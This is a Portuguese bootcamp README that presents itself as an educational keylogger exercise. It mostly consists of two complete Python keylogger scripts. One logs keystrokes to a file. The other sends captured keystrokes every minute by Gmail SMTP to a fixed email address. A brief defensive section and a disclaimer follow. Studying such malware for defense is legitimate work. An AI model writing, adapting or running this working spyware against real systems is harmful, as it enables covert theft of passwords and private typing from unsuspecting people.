# dio-bootcamp-santander-keylogger
Simulando um malware de captura de dados simples em python e aprendendo a se proteger.

# Simulação Educacional de Keylogger e Estratégias de Defesa em Python

Repositório desenvolvido para o desafio prático de cibersegurança do bootcamp Santander, com foco educacional, análise técnica e defesa, executado exclusivamente em ambiente virtualizado isolado (VM de laboratório).

## 🎯 Objetivos do Desafio
- Compreender na prática como um **Keylogger** em Python intercepta eventos de teclado e grava entradas em arquivo texto.
- Analisar o comportamento de cada bloco e comando do script sob a ótica de segurança ofensiva/defensiva.
- Documentar limitações da implementação e medidas de prevenção, detecção e resposta a incidentes.

## 🧪 Ambiente de Testes
- **Ambiente:** Máquina virtual isolada para laboratório educacional (sem dados reais ou rede de produção).
- **Linguagem e Dependências:** Python 3.x e biblioteca `pynput`.
- **Finalidade:** Estudo prático de segurança da informação e portfólio técnico.

---

## 💻 Código do Keylogger (`keylogger.py`)

```python
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,
}

def on_press(key):
    try:
        # se for uma tecla "normal" (letra, número, símbolo)

        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
## 💻 Código de envio do keylogger por email (`keylogger_email.py`)

```python
import os
import smtplib
from email.mime.text import MIMEText
from threading import Timer
from pynput import keyboard

log = ""

EMAIL_ORIGEM = "cyber.multitools@gmail.com"
EMAIL_DESTINO = "cyber.multitools@gmail.com"
SENHA_EMAIL = os.getenv("SENHA_EMAIL", "*** **** **** ****")


def enviar_email():
    global log

    try:
        if log:
            conteudo = log
            log = ""

            msg = MIMEText(conteudo)
            msg["Subject"] = "Dados capturados pelo Keylogger"
            msg["From"] = EMAIL_ORIGEM
            msg["To"] = EMAIL_DESTINO

            with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as server:
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(EMAIL_ORIGEM, SENHA_EMAIL)
                server.send_message(msg)
    except Exception as e:
        print("Erro ao enviar:", repr(e))
    finally:
        Timer(60, enviar_email).start()


def on_press(key):
    global log
    try:
        if key.char is not None:
            log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"


with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
```
##🛡️ Defesa, Detecção e Mitigação
Antivírus e EDR: Detecção comportamental de processos que registram hooks de teclado globais, acessam APIs de entrada ou exibem padrões típicos de scripts maliciosos.

Controle de Execução e Privilégio Mínimo: Restrição de execução de scripts não autorizados, bloqueio de diretórios graváveis pelo usuário e uso de contas com privilégios limitados.

Monitoramento de Rede e Firewall: Controle de tráfego de saída (egress) para impedir exfiltração não autorizada de logs ou credenciais.

Sandboxing e Conscientização: Análise de arquivos suspeitos em ambientes isolados e treinamento contínuo contra phishing e engenharia social.

⚠️ Aviso Legal
Este material tem finalidade exclusivamente educacional e de pesquisa em segurança da informação. Utilize os scripts e análises apenas em ambientes controlados e com autorização explícita.
